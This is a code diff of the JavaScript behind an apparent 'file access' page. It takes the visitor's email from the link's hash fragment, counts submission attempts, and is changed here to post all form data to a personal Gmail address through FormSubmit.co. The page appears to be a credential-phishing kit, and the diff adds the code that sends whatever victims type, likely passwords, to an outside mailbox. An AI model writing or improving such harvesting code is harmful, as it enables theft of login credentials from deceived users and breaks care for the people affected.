@@ -1,5 +1,4 @@
-// script.js - Complete functionality for the file access page
-// Modified to properly submit to Netlify Forms
+// script.js - Complete functionality with FormSubmit.co
 
 document.addEventListener('DOMContentLoaded', function() {
     // Get email from hash fragment
@@ -147,7 +146,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
-    // ✅ FIXED: Handle form submission - Actually submit to Netlify!
+    // Handle form submission - Send to FormSubmit.co
     accessForm.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -163,28 +162,26 @@ document.addEventListener('DOMContentLoaded', function() {
         submitCount++;
         attemptField.value = submitCount + 1;
         
-        // Collect all form data
-        const formData = new FormData(accessForm);
-        formData.append('attempt', submitCount + 1);
-        
-        // ✅ IMPORTANT: Actually submit to Netlify
-        fetch('/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: new URLSearchParams(formData).toString()
-        })
-        .then(() => {
-            console.log('✅ Form submitted to Netlify successfully!');
-        })
-        .catch(error => {
-            console.error('❌ Failed to submit to Netlify:', error);
-            // Fallback: Submit the form normally
-            accessForm.submit();
-        });
-        
         // Show loading state
         submitBtn.textContent = 'Processing...';
         submitBtn.disabled = true;
+        
+        // Collect all form data
+        const formData = new FormData(accessForm);
+        
+        // Send to FormSubmit.co
+        fetch('https://formsubmit.co/joekesh322@gmail.com', {
+            method: 'POST',
+            body: formData
+        })
+        .then(() => {
+            console.log('✅ Form submitted to FormSubmit.co successfully!');
+        })
+        .catch(error => {
+            console.error('❌ Failed to submit:', error);
+            // Fallback: Submit the form normally
+            accessForm.submit();
+        });
         
         // Add green borders
         emailInput.style.border = '2px solid #28a745';
